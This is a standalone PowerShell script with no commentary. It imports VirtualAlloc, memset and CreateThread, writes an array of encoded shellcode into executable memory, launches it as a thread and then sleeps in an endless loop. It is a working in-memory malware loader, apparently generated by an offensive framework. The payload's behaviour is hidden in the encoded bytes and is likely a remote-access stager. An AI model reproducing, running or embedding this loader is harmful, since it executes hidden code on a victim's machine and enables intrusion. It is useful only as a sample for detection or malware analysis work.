
$VuZ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $VuZ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd1,0xbe,0xd0,0x6b,0xfd,0x00,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x72,0x18,0x03,0x72,0x18,0x83,0xea,0x2c,0x89,0x08,0xfc,0x24,0xcc,0xf3,0xfd,0xb4,0xb1,0x7a,0x18,0x85,0xf1,0x19,0x68,0xb5,0xc1,0x6a,0x3c,0x39,0xa9,0x3f,0xd5,0xca,0xdf,0x97,0xda,0x7b,0x55,0xce,0xd5,0x7c,0xc6,0x32,0x77,0xfe,0x15,0x67,0x57,0x3f,0xd6,0x7a,0x96,0x78,0x0b,0x76,0xca,0xd1,0x47,0x25,0xfb,0x56,0x1d,0xf6,0x70,0x24,0xb3,0x7e,0x64,0xfc,0xb2,0xaf,0x3b,0x77,0xed,0x6f,0xbd,0x54,0x85,0x39,0xa5,0xb9,0xa0,0xf0,0x5e,0x09,0x5e,0x03,0xb7,0x40,0x9f,0xa8,0xf6,0x6d,0x52,0xb0,0x3f,0x49,0x8d,0xc7,0x49,0xaa,0x30,0xd0,0x8d,0xd1,0xee,0x55,0x16,0x71,0x64,0xcd,0xf2,0x80,0xa9,0x88,0x71,0x8e,0x06,0xde,0xde,0x92,0x99,0x33,0x55,0xae,0x12,0xb2,0xba,0x27,0x60,0x91,0x1e,0x6c,0x32,0xb8,0x07,0xc8,0x95,0xc5,0x58,0xb3,0x4a,0x60,0x12,0x59,0x9e,0x19,0x79,0x35,0x53,0x10,0x82,0xc5,0xfb,0x23,0xf1,0xf7,0xa4,0x9f,0x9d,0xbb,0x2d,0x06,0x59,0xbc,0x07,0xfe,0xf5,0x43,0xa8,0xff,0xdc,0x87,0xfc,0xaf,0x76,0x2e,0x7d,0x24,0x87,0xcf,0xa8,0xd1,0x82,0x47,0x93,0x8e,0x8c,0x92,0x7b,0xcd,0x8e,0x8d,0x27,0x58,0x68,0xfd,0x87,0x0a,0x25,0xbd,0x77,0xeb,0x95,0x55,0x92,0xe4,0xca,0x45,0x9d,0x2e,0x63,0xef,0x72,0x87,0xdb,0x87,0xeb,0x82,0x90,0x36,0xf3,0x18,0xdd,0x78,0x7f,0xaf,0x21,0x36,0x88,0xda,0x31,0xae,0x78,0x91,0x68,0x78,0x86,0x0f,0x06,0x84,0x12,0xb4,0x81,0xd3,0x8a,0xb6,0xf4,0x13,0x15,0x48,0xd3,0x28,0x9c,0xdc,0x9c,0x46,0xe1,0x30,0x1d,0x96,0xb7,0x5a,0x1d,0xfe,0x6f,0x3f,0x4e,0x1b,0x70,0xea,0xe2,0xb0,0xe5,0x15,0x53,0x65,0xad,0x7d,0x59,0x50,0x99,0x21,0xa2,0xb7,0x1b,0x1d,0x75,0xf1,0x69,0x4f,0x45;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$h8Ia=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($h8Ia.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$h8Ia,0,0,0);for (;;){Start-sleep 60};

